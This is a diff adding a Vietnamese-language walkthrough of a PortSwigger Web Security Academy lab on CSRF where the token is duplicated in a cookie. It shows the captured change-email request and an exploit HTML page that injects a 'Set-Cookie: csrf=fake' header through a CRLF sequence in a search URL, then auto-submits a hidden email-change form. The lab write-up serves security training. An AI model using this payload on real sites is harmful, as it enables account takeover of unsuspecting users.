@@ -1,0 +1,30 @@
+CSRF - CSRF where token is duplicated in cookie
+
+End Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+You can log in to your own account using the following credentials: wiener:peter
+
+Analystic
+---------
+Bước 1: mở trình duyệt burp, truy cập vào link của bài lab, thực hiện login và thay đổi email
+Bước 2: vào history để kiểm tra, phần sửa email, ta có được request như sau:
+POST /my-account/change-email HTTP/2
+Host: 0a1e001f03977fff80ec21f4005300c3.web-security-academy.net
+Cookie: csrf=VaJYFWOXv3TMo9Hu8BTcvBxlWQcjZ6nQ; session=6Bet8PtNvFGvkmf0bUXOduj8680ii0uc
+......
+email=qwe%40gmail.com&csrf=VaJYFWOXv3TMo9Hu8BTcvBxlWQcjZ6nQ
+từ request trên, ta có 1 số thông tin như sau:
+method: POST
+endpoint: /my-account/change-email
+có sử dụng csrf ở cả phần cookie và giá trị khi muốn sửa email
+Gửi request này tới repeater. Ta thử sửa phần sessionId và gửi request đi thì thấy response đưa ta đến /login, tuy nhiên khi sửa csrf và gửi request, ta nhận được thông báo invalid csrf token --> sessionId và csrf không được liên kết với nhau mà xử lý riêng --> ta có thể lợi dụng điểm này để truyền vào giá trị của 1 tài khoản ta kiểm soát cho nạn nhân. 
+Tiếp đến quan sát gói tin ta thấy phần csrf trong cookie và trong body có giá trị tương tự nhau --> nếu ta thử thay đổi cả 2 thành 1 giá trị thì gói tin vẫn gửi đi được --> ta không cần phải lấy giá trị từ 1 tài khoản dưới quyền kiểm soát, miễn 2 giá trị này giống nhau thì có thể update email
+Bước 3: Vào exploit server tượng trưng cho 1 website mà ta kiểm soát, thực hiện mô phỏng lại request với body như sau:
+<html>
+    <body>
+    <form action="https://0a1e001f03977fff80ec21f4005300c3.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="123@gmail.com">
+        <input type="hidden" name="csrf" value="fake">
+    </form>
+    <img src="https://0a1e001f03977fff80ec21f4005300c3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake;SameSite=None" onerror="document.forms[0].submit();">
+    </body>
+</html>
